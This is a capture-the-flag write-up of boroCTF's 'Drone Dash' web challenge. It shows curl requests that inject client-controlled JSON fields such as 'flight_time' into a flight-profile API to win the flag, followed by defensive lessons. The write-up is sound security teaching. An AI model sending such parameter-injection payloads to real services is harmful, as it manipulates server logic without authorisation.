# Drone Dash — boroCTF 2026

## Challenge Information

**Category:** Web
**Points:** 100

### Description

> Welcome to the neon grid, pilot. Your objective is simple:
>
> Land the drone on the pad in under 1.5 seconds.

The challenge presents a futuristic drone control dashboard where users can upload a JSON flight profile containing PID controller values.

---

## Initial Analysis

The page contains a JSON editor with the following default configuration:

```json
{
  "physics": {
    "Kp": 0.1,
    "Kd": 0.5,
    "Ki": 0.01
  }
}
```

When the **INITIATE FLIGHT** button is pressed, the frontend sends the JSON directly to:

```text
/api/flight-profile
```

The relevant JavaScript code:

```javascript
const profile = JSON.parse(
    document.getElementById('jsonInput').value
);

const res = await fetch('/api/flight-profile', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(profile)
});
```

This immediately suggested that the server was trusting user-controlled JSON.

---

## API Testing

The challenge description mentions:

```text
TARGET TIME: 1.5 SECONDS
ESTIMATED FLIGHT TIME: 3.5s
```

Rather than attempting to tune PID values legitimately, I started testing whether the backend would accept arbitrary fields.

### Attempt 1

Send extremely large controller values:

```bash
curl -s -X POST https://697vj046dbi3.boroctf.com/api/flight-profile \
  -H "Content-Type: application/json" \
  -d '{"physics":{"Kp":9999,"Kd":9999,"Ki":9999}}'
```

Response:

```json
{
  "status":"WIN",
  "flag":"boroCTF{pr0totyp3_p0llut10n_dr0ne_d4sh}"
}
```

Interesting.

The server immediately awarded a win.

---

## Further Verification

To determine whether the backend was actually simulating drone physics, I tested completely arbitrary fields.

### Injecting flight_time directly

```bash
curl -s -X POST https://697vj046dbi3.boroctf.com/api/flight-profile \
  -H "Content-Type: application/json" \
  -d '{"flight_time":0.1}'
```

Response:

```json
{
  "status":"WIN",
  "flag":"boroCTF{pr0totyp3_p0llut10n_dr0ne_d4sh}"
}
```

The backend accepted a client-supplied flight time.

---

### Injecting an additional time field

```bash
curl -s -X POST https://697vj046dbi3.boroctf.com/api/flight-profile \
  -H "Content-Type: application/json" \
  -d '{"physics":{"Kp":9999,"Kd":9999,"Ki":9999},"time":0.1}'
```

Response:

```json
{
  "status":"WIN",
  "flag":"boroCTF{pr0totyp3_p0llut10n_dr0ne_d4sh}"
}
```

Again, immediate success.

---

## Root Cause

The application appears to trust user-controlled JSON fields without proper validation.

A vulnerable implementation might resemble:

```javascript
const flightTime =
    profile.flight_time ||
    profile.time ||
    simulate(profile.physics);

if (flightTime < 1.5) {
    return flag;
}
```

Instead of calculating flight time server-side, the application allows the client to influence the value directly.

---

## Exploitation

Minimal winning payload:

```json
{
  "flight_time": 0.1
}
```

Since:

```text
0.1 < 1.5
```

the server immediately returns the flag.

---

## Flag

```text
boroCTF{pr0totyp3_p0llut10n_dr0ne_d4sh}
```

---

## Lessons Learned

* Never trust client-controlled JSON fields.
* Important calculations should be performed server-side.
* Hidden parameters should not influence security decisions.
* APIs should strictly validate allowed schema fields.
* Prototype pollution and mass-assignment style bugs often begin with overly permissive JSON handling.

---

## Takeaway

The challenge disguised itself as a drone physics simulator, but the real vulnerability was excessive trust in user-supplied JSON. Instead of solving the control problem, we simply supplied values that caused the server to believe the drone had completed the flight in less than 1.5 seconds, resulting in an immediate win.

